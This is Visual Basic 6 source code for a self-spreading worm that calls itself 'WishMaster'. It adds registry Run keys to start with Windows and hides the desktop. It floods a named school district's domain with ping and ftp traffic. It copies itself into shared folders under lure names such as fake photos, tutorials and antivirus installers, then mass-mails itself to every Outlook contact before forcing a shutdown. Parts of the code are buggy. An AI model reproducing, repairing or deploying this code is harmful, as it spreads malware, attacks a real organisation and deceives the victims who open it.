Private Sub Form_Load()
On Error Resume Next
Dim A As Object
Set A = CreateObject("WScript.Shell")
A.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\NoDesktop", _
"1", "REG_DWORD"

Form1.visble = False
Set virri = CreateObject("Wscript.shell")
norton.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\run\WM31337", App.Path + "\" + App.EXEName + ".exe"
Set virri = CreateObject("Wscript.shell")
virri.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\run\systems", App.Path + "\" + App.EXEName + ".exe"
Set norton = CreateObject("Wscript.shell")
norton.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\run\startup", App.Path + "\" + App.EXEName + ".exe"
Do
Shell "ftp -n www.greenville.k12.sc.us", vbHide
Loop
Shell "net stop"
Shell "www.bootytalk.com"
MsgBox "Thanks for Unlocking me", vbExclamation, "WishMaster"
Shell "ping -t -l 55555 -w 0 www.greenville.k12.sc.us", vbHide
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\documents and settings\lesbian.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\documents and settings\all users\start menu\Wishmaster.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\documents and settings\all users\desktop\gay porn.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\documents and settings\all users\shared documents\norton antivirus.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\documents and settings\all users\favorites\ntusers31337.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\program files\superuser.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\Asian pussy.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\program files\my shared folder\norton antivirus.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\sys32.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\pics.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\shared documents.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\help.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\vb tutorial.txt.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\VisualBasics 6.0.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\norton Antivirus 7.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared Folder\pinger.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\learn C++ 10 days.txt.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\Bow Wow.jpg.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\lil kim.jpg.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\jena Jamison.jpg.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\python tutorial.txt.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\monopoly.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\RollerCoaster Tycoon.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\Britney Spears.jpg.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\Janet Jackson.jpg.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\fun.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\realPlayer.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\zoo tycoon.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\bootytalk.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\lesbian with dick.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\my shared folder\Girls gone Wild.mpg.exe"

If done Then
MsgBox "Make a Wish by sending this file to a freind", vbInformation, "WishMaster"

Set so = CreateObject(fso)
Set ol = CreateObject("Outlook.Application")
Set out = Wscript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set A = mapi.AddressLists(1)
For X = 1 To A.AddressEntries.Count
Set Mail = ol.CreateItem(0)
Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
Mail.Subject = "Fwd:None"
Mail.Body = "hey i got that new pic for you"
Mail.Attachments.Add = "C:\Pics.exe"
Mail.Send
Next
ol.Quit
If sent Then
MsgBox "Email Sent", vbCritical, "WishMaster"
MsgBox "WishMaster shutdown and Complete", vbCritical, "WishMaster"
Shell "rundll32.exe user.exe,exitwindows"
Shell "Shutdown.exe -s -f -t 60", vbMaximizeFocus - r

End Sub